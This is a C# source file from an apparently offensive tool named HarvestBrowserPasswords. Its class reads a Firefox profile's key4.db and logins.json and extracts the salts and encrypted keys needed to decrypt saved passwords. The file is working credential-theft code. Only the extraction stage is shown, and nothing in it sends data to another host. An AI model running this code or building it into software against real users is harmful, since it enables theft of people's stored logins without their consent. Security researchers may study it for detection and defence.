using System;
using System.IO;
using System.Collections;
using System.Collections.Specialized;
using System.Linq;
using System.Text;
using System.Data.SQLite;
using Newtonsoft.Json;
using System.Security.Cryptography;

namespace HarvestBrowserPasswords
{
    public class FirefoxDatabaseDecryptor
    {
        private string ProfileDir { get; set; }
        private string Key4dbpath { get; set; }
        public byte[] EntrySaltPasswordCheck { get; set; }
        private byte[] EntrySalt3DESKey { get; set; }
        public byte[] CipherTextPasswordCheck { get; set; }
        public byte[] CipherText3DESKey { get; set; }
        public string MasterPassword { get; set; }

        public FirefoxDatabaseDecryptor(string profile)
        {
            ProfileDir = profile;
            Key4dbpath = ProfileDir + @"\key4.db";

            //Check profile for key4 database before attempting decryption
            if (File.Exists(Key4dbpath))
            {
                Key4DatabaseConnection(Key4dbpath);

                //Store a RootObject from FirefoxLoginsJSON (hopefully) containing multiple FirefoxLoginsJSON.Login instances
                FirefoxLoginsJSON.Rootobject JSONLogins = GetJSONLogins(ProfileDir);
            }
        }

        // read logins.json file and deserialize the JSON into FirefoxLoginsJSON class
        public FirefoxLoginsJSON.Rootobject GetJSONLogins(string profileDir)
        {

            //Read logins.json from file and deserialise JSON into FirefoxLoginsJson object
            string file = File.ReadAllText(profileDir + @"\logins.json");
            FirefoxLoginsJSON.Rootobject JSONLogins = JsonConvert.DeserializeObject<FirefoxLoginsJSON.Rootobject>(file);

            return JSONLogins;
        }

        public void Key4DatabaseConnection(string key4dbPath)
        {
            SQLiteConnection connection = new SQLiteConnection(
                $"Data Source={key4dbPath};" +
                $"Version=3;" +
                $"New=True");

            try
            {
                connection.Open();

                //First query the metadata table to verify the master password
                SQLiteCommand commandPasswordCheck = connection.CreateCommand();
                commandPasswordCheck.CommandText = "SELECT item1,item2 FROM metadata WHERE id = 'password'";
                SQLiteDataReader dataReader = commandPasswordCheck.ExecuteReader();

                //Parse the ASN.1 data in the 'password' row to extract entry salt and cipher text for master password verification
                while (dataReader.Read())
                {
                    byte[] globalSalt = (byte[])dataReader[0];
                    //https://docs.microsoft[.]com/en-us/dotnet/api/system.security.cryptography.asnencodeddata?view=netframework-4.8#constructors
                    byte[] item2Bytes = (byte[])dataReader[1];

                    ASN1Parser parser = new ASN1Parser(item2Bytes);

                    EntrySaltPasswordCheck = parser.EntrySalt;
                    CipherTextPasswordCheck = parser.CipherText;
                }

                //Second, query the nssPrivate table for entry salt and encrypted 3DES key
                SQLiteCommand commandNSSPrivateQuery = connection.CreateCommand();
                commandNSSPrivateQuery.CommandText = "SELECT a11,a102 FROM nssPrivate";
                dataReader = commandNSSPrivateQuery.ExecuteReader();

                //Parse the ASN.1 data in the 'password' row to extract entry salt and cipher text for master password verification
                while (dataReader.Read())
                {
                    byte[] a11 = (byte[])dataReader[0];
                    //https://docs.microsoft[.]com/en-us/dotnet/api/system.security.cryptography.asnencodeddata?view=netframework-4.8#constructors
                    byte[] a102 = (byte[])dataReader[1]; // Probably don't need this???

                    ASN1Parser parser = new ASN1Parser(a11);

                    EntrySalt3DESKey = parser.EntrySalt;
                    CipherText3DESKey = parser.CipherText;
                }

            }
            catch (Exception e)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"Exception: {e}");
            }
            finally
            {
                connection.Dispose();
            }
        }
    }
}
